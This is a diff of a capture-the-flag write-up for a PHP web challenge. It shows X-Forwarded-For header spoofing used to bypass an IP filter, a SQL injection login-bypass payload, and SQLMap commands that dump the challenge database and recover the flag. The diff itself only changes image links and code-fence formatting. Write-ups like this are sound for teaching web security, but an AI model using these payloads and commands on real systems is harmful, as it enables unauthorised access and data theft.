@@ -2,15 +2,15 @@
 
 We are presented with a PHP webpage. There is a `login.php`, but it gives us a 403 Forbidden error. Looking a little deeper into `gallery.php` shows us that some of the pictures of the devices include internal subnet addresses.
 
-![](../../.gitbook/assets/image%20%2815%29.png)
+![](<../../.gitbook/assets/image (14).png>)
 
-![](../../.gitbook/assets/image%20%2816%29.png)
+![](<../../.gitbook/assets/image (15).png>)
 
 One way that the login page might be filtering requests is by the user's IP address. The `X-Forwarded-For` header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. 
 
 However, it can also be easily changed by the client. By running a Burp Suite Intruder scan for the request header`X-Forwarded-For: 192.168.3.x`, where `x` is the payload, we see that by setting the `X-Forwarded-For` header to `192.168.3.16`, we gain access to the login page.
 
-![](../../.gitbook/assets/image%20%2814%29.png)
+![](<../../.gitbook/assets/image (16).png>)
 
 We see a form with `username` and `password` fields. Using `'` in username parameter leads to the following output:
 
@@ -20,7 +20,7 @@ We see a form with `username` and `password` fields. Using `'` in username param
 
 We have identified an SQL injection vulnerability. By using the following payload, we can bypass the authentication.
 
-```text
+```
 username=test&password=test' or 1=1 LIMIT 1;#
 ```
 
@@ -56,7 +56,7 @@ We found that `/users.php?id=1` returns only the data for user ID 1. Fuzzing the
 
 Using SQLMap, we get the following injection vectors:
 
-```text
+```
 ---
 Parameter: id (GET)
     Type: boolean-based blind
@@ -75,7 +75,7 @@ Parameter: id (GET)
 
 `sqlmap -r get.req --threads 10 --dbms mysql --dump --no-escape --tamper=between` dumps the database.
 
-```text
+```
 Database: users_data
 Table: data
 [3 entries]
@@ -88,7 +88,7 @@ Table: data
 +----+-------+-------------------+-----------+
 ```
 
-```text
+```
 Database: login_users
 Table: users
 [1 entry]
@@ -112,4 +112,3 @@ However, by specifying the specific table and column to dump, we got our results
 `sqlmap -u http://challenges.ctfd.io:30232/login.php --headers=“X-Forwarded-For: 192.168.3.16” --data “password=1&username=test” --dbms=mysql --tamper=between -D users_data -T data -C R34L_F14G --dump --where “id=3”`
 
 This gave us the flag, `S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}`.
-
